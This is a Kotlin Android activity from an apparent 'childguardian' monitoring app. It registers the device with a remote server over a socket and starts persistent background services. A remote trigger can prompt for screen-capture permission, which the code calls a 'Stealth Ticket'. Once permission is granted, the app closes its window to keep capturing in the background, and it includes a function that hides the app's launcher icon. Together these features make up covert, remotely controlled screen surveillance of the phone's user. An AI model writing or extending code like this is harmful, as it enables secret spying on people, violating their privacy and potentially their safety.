package com.childguardian

import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.view.WindowManager
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.childguardian.data.remote.socket.SocketManager
import com.childguardian.data.repository.DeviceRepository
import com.childguardian.services.core.CoreService
import com.childguardian.services.screen.MediaProjectionHolder
import com.childguardian.services.screen.ScreenCaptureService
import com.childguardian.utils.DeviceIdGenerator
import com.childguardian.utils.DeviceInfoHelper
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import timber.log.Timber
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : AppCompatActivity() {

    @Inject
    lateinit var deviceRepository: DeviceRepository

    @Inject
    lateinit var socketManager: SocketManager

    @Inject
    lateinit var mediaProjectionHolder: MediaProjectionHolder


    // 1. The Launcher: Grabs the ticket and sends it to the Vault
    // 1. The Launcher: Grabs the ticket and sends it to the Vault
    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->

        // ADD THIS: The box is gone, tell the bouncer to open the door again!
        isBoxCurrentlyShowing = false

        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            Timber.d("Permission granted! Sending ticket to Service for safekeeping...")

            val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                action = "ACTION_SAVE_TICKET" // Tells the service to securely store the ticket
                putExtra("RESULT_CODE", result.resultCode)
                putExtra("DATA", result.data)
            }

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }

            // Close the app UI so it runs in the background
            finish()
        } else {
            Timber.e("User denied the initial permission.")
            finish()
        }
    }

    private var shouldPopPermissionBox = false
    private var isBoxCurrentlyShowing = false // The ultimate double-popup shield

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)
        setContentView(R.layout.activity_main)

        // Set the flag if launched via remote trigger
        if (intent?.getBooleanExtra("REMOTE_TRIGGER", false) == true) {
            shouldPopPermissionBox = true
        }

        lifecycleScope.launch {
            val deviceInfo = deviceRepository.getDeviceInfoSync()
            if (deviceInfo?.registered == true) {
                Timber.d("Device already registered, starting background services")
                socketManager.connect(deviceInfo.deviceId)
                startBackgroundServices()

                // If it wasn't a remote trigger, we still want to pop it on first launch
                if (!shouldPopPermissionBox) {
                    shouldPopPermissionBox = true
                }
                // Don't call checkAndPopBox() here. Let onResume handle it safely.
            } else {
                performRegistration()
            }
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        if (intent?.getBooleanExtra("REMOTE_TRIGGER", false) == true) {
            Timber.d(">>> Woken up by Mac in background! Setting flag... <<<")
            shouldPopPermissionBox = true
            // Don't call checkAndPopBox() here. Let onResume handle it.
        }
    }

    override fun onResume() {
        super.onResume()
        checkAndPopBox()
    }

    private fun checkAndPopBox() {
        runOnUiThread { // <--- ADD THIS LINE to force it onto the UI thread!
            if (shouldPopPermissionBox && !isBoxCurrentlyShowing) {
                Timber.d(">>> Safe to pop! Popping permission box... <<<")
                shouldPopPermissionBox = false
                isBoxCurrentlyShowing = true
                popPermissionBox()
            }
        }
    }

    // IMPORTANT: Wherever you handle the RESULT of the permission box
    // (e.g., inside onActivityResult or your ActivityResultLauncher callback),
    // you MUST set `isBoxCurrentlyShowing = false` so the app knows the box is gone!

    private fun popPermissionBox() {
        Timber.d("Popping permission box to secure the Stealth Ticket...")
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        screenCaptureLauncher.launch(mediaProjectionManager.createScreenCaptureIntent())
    }

    private suspend fun performRegistration() {
        val deviceId = DeviceIdGenerator.getDeviceId(this)
        val request = DeviceInfoHelper.getDeviceInfo(this, deviceId)

        Timber.d("Registering device: $request")

        deviceRepository.registerDevice(request).fold(
            onSuccess = {
                Timber.d("Registration successful")
                socketManager.connect(deviceId)
                startBackgroundServices()

                // Route it through the bouncer instead of popping directly!
                shouldPopPermissionBox = true
                checkAndPopBox()
            },
            onFailure = { error ->
                Timber.e(error, "Registration failed")
            }
        )
    }

    private fun startBackgroundServices() {
        Timber.d("Starting background services")
        val intent = Intent(this, CoreService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
    }

    private fun hideAppIcon() {
        val packageManager = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }
}